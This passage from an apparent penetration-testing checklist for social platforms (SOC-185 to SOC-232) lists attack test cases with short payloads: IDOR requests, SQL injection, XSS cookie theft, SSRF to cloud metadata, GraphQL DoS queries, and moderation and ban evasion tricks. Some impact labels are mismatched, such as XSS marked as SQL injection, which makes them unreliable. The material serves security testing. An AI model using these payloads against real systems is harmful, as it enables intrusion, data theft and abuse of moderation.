**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Report content 2. Modify reporter_id 3. File report as victim

**Expected Result:** Reports should use authenticated user

**Payload Example:**

```
POST /api/reports {"reporter_id":"victim",content_id:"123"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-186 — False Report Abuse
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Mass report legitimate content 2. Trigger automatic removal 3. Abuse reporting system

**Expected Result:** False reports should be detected

**Payload Example:**

```
Coordinated false reporting
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-187 — Report SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Submit report with SQL payload 2. Inject in reason field 3. Extract data

**Expected Result:** Report submissions should be sanitized

**Payload Example:**

```
reason='; SELECT * FROM reports--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-188 — Report XSS - Admin Panel
**Test Category:** Cross-Site Scripting · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Submit report with XSS 2. Admin views report 3. XSS executes in admin context

**Expected Result:** Reports should be sanitized for admin view

**Payload Example:**

```
<script>sendAdminCookies()</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-189 — Report Bypass via Encoding
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Post banned content 2. Use encoding to bypass detection 3. Evade automatic moderation

**Expected Result:** Content detection should handle encoding

**Payload Example:**

```
Unicode or URL encoded offensive content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## SOC-190 — Reported Content Access
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Access reported content 2. View before moderation decision 3. Content still visible

**Expected Result:** Reported content should have restricted visibility

**Payload Example:**

```
Access content under review
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-191 — Report Status IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Check own report status 2. Modify report_id 3. View others' report statuses

**Expected Result:** Report statuses should be private

**Payload Example:**

```
GET /api/reports/victim_report_id/status
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-192 — Report Appeal IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Appeal own report 2. Modify report_id 3. Appeal others' reports

**Expected Result:** Appeals should verify reporter identity

**Payload Example:**

```
POST /api/reports/victim_report_id/appeal
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-193 — Mass Report DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Submit many reports rapidly 2. Overwhelm moderation queue 3. DoS moderation system

**Expected Result:** Report submission should be rate-limited

**Payload Example:**

```
1000 reports per minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-194 — Report Category Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Select report category 2. Inject custom category 3. Bypass categorization

**Expected Result:** Categories should be from predefined list

**Payload Example:**

```
category=<script>alert(1)</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-195 — Anonymous Report Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Content

**Test Steps:** 1. Submit anonymous report 2. Check for reporter identity exposure 3. De-anonymize reports

**Expected Result:** Anonymous reports should protect identity

**Payload Example:**

```
Reporter info in response or logs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-196 — Moderation Action IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Moderate own content 2. Modify content_id 3. Moderate others' content

**Expected Result:** Moderation should require mod privileges

**Payload Example:**

```
POST /api/moderate {"content_id":"any",action:"remove"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-197 — Moderator Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Log in as moderator 2. Access admin functions 3. Escalate privileges

**Expected Result:** Moderator and admin roles should be separate

**Payload Example:**

```
Access /api/admin endpoints as moderator
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-198 — Moderation Log IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. View moderation logs 2. Access without authorization 3. View sensitive actions

**Expected Result:** Mod logs should require appropriate access

**Payload Example:**

```
GET /api/moderation-logs without mod role
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-199 — Appeal Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Submit appeal 2. Modify appeal to overturn any decision 3. Restore banned content

**Expected Result:** Appeals should follow proper workflow

**Payload Example:**

```
PUT /api/appeals/123 {"status":"approved"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-200 — Automated Moderation Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Analyze auto-moderation 2. Find bypass techniques 3. Post banned content

**Expected Result:** Auto-moderation should be comprehensive

**Payload Example:**

```
Homoglyphs or image text bypass
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SOC-201 — Moderation Timing Attack
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Post and time removal 2. Analyze moderation patterns 3. Identify working hours

**Expected Result:** Moderation timing should not leak info

**Payload Example:**

```
Time-based analysis of moderation
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-202 — Shadow Ban Detection
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Post content 2. Check if shadow banned 3. Detect hidden restrictions

**Expected Result:** Shadow bans should be undetectable if used

**Payload Example:**

```
Compare visibility from different accounts
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-203 — Moderation History Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Access moderation history 2. Modify records 3. Hide moderation actions

**Expected Result:** Mod history should be immutable

**Payload Example:**

```
PUT /api/moderation-history/123
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-204 — Ban Evasion Detection Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Get banned 2. Create new account 3. Evade detection

**Expected Result:** Ban evasion should be detected

**Payload Example:**

```
New account bypassing device/IP bans
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-205 — Content Filter Bypass - Unicode
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Use Unicode variations 2. Bypass text filters 3. Post banned words

**Expected Result:** Filters should normalize Unicode

**Payload Example:**

```
Ν​ο​t​ ​b​a​n​n​e​d (with zero-width chars)
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## SOC-206 — Content Filter Bypass - Encoding
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Use various encodings 2. Bypass detection 3. Post restricted content

**Expected Result:** Filters should decode before checking

**Payload Example:**

```
Base64 or URL encoded banned content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## SOC-207 — Moderator Action Without Audit
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Moderation

**Test Steps:** 1. Perform mod action 2. Check audit logs 3. Action not logged

**Expected Result:** All mod actions should be logged

**Payload Example:**

```
Mod actions missing from audit trail
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Log Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SOC-208 — Guidelines Page XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Find user-contributed guidelines section 2. Inject XSS 3. Execute on visitors

**Expected Result:** Guidelines content should be sanitized

**Payload Example:**

```
<script>alert(1)</script> in guidelines
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-209 — Strike System Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Receive strike 2. Manipulate strike count 3. Avoid consequences

**Expected Result:** Strike counts should be server-controlled

**Payload Example:**

```
Modify strike_count in request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-210 — Strike IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. View own strikes 2. Modify user_id 3. View others' strikes

**Expected Result:** Strike information should be private

**Payload Example:**

```
GET /api/users/victim/strikes
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-211 — Appeal System IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Submit appeal 2. Modify appeal_id 3. Access others' appeals

**Expected Result:** Appeals should be private

**Payload Example:**

```
GET /api/appeals/victim_appeal_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-212 — Selective Enforcement Exploitation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Identify enforcement patterns 2. Exploit inconsistencies 3. Post banned content

**Expected Result:** Enforcement should be consistent

**Payload Example:**

```
Content allowed for some but not others
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SOC-213 — Age Restriction Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Set age under restriction 2. Access adult content 3. Bypass age gate

**Expected Result:** Age restrictions should be enforced

**Payload Example:**

```
Modify birthdate to access restricted content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-214 — Geo-restriction Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Content restricted by region 2. Use VPN or proxy 3. Access restricted content

**Expected Result:** Consider geo-restrictions carefully

**Payload Example:**

```
VPN to access region-locked content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** VPN / Proxy

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-215 — Verification Badge Fraud
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Request verification 2. Manipulate request 3. Obtain badge fraudulently

**Expected Result:** Verification should require proper review

**Payload Example:**

```
POST /api/verification {"status":"approved"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-216 — Trust Score Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. View trust score 2. Manipulate factors 3. Inflate trust score

**Expected Result:** Trust scores should be tamper-proof

**Payload Example:**

```
Artificially inflate engagement metrics
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SOC-217 — Banned Content Type Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Community Guidelines Enforcement

**Test Steps:** 1. Identify banned content type 2. Disguise as allowed type 3. Post banned content

**Expected Result:** Content type detection should be robust

**Payload Example:**

```
Rename video to image extension
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / File Manipulation

**References:** CWE-840; PortSwigger Business logic

---

## SOC-218 — WebSocket Message Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Connect to chat WebSocket 2. Inject malicious messages 3. Impersonate or XSS

**Expected Result:** WebSocket messages should be validated

**Payload Example:**

```
{"type":"message",from:"admin",content:"<script>"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / WS King

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-219 — WebSocket Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Connect without authentication 2. Send messages 3. Bypass auth

**Expected Result:** WebSocket should require authentication

**Payload Example:**

```
WS connection without session token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / WS King

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-220 — Real-time Notification Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Connect to notification channel 2. Inject fake notifications 3. Phish users

**Expected Result:** Notifications should be server-only

**Payload Example:**

```
Inject fake "password reset" notification
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-221 — Activity Status Spoofing
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Modify online status 2. Appear offline while active 3. Stalk users

**Expected Result:** Status should reflect actual activity

**Payload Example:**

```
Modify status while browsing
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-222 — Profile Privacy Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Set profile to private 2. Access via API 3. View private profile

**Expected Result:** Privacy should be enforced everywhere

**Payload Example:**

```
GET /api/users/private_user/profile
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-223 — Notification Settings IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Change notification settings 2. Modify user_id 3. Change others' settings

**Expected Result:** Settings should be user-specific

**Payload Example:**

```
PUT /api/users/victim/notifications
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-224 — Content Embedding SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Embed external content 2. Use internal URL 3. SSRF via embed

**Expected Result:** Embed URLs should be validated

**Payload Example:**

```
embed_url=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SOC-225 — Open Graph Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Share URL with malicious OG tags 2. Generate preview 3. XSS in preview

**Expected Result:** OG content should be sanitized

**Payload Example:**

```
URL with XSS in og:title
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-226 — Social Login Token Theft
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Initiate social login 2. Intercept OAuth flow 3. Steal access token

**Expected Result:** OAuth should use state parameter

**Payload Example:**

```
Missing state parameter validation
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-227 — Account Linking IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Link social account 2. Modify linking request 3. Link to victim's account

**Expected Result:** Account linking should verify ownership

**Payload Example:**

```
POST /api/link-account {"user_id":"victim"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-228 — Session Fixation in Social Features
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Get session before login 2. Victim authenticates 3. Hijack session

**Expected Result:** Session should regenerate on login

**Payload Example:**

```
Fixed session_id accessing social features
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## SOC-229 — GraphQL Introspection Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Query GraphQL schema 2. Find hidden fields 3. Access internal data

**Expected Result:** Introspection should be disabled in production

**Payload Example:**

```
{ __schema { types { fields { name } } } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SOC-230 — GraphQL Batch Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Send batched GraphQL queries 2. Include many operations 3. DoS server

**Expected Result:** Query batching should be limited

**Payload Example:**

```
[{query1},{query2},...{query1000}]
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SOC-231 — GraphQL Depth Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Create deeply nested query 2. Exhaust server resources 3. DoS

**Expected Result:** Query depth should be limited

**Payload Example:**

```
{ user { friends { friends { friends... } } } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Tools / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SOC-232 — API Versioning Bypass
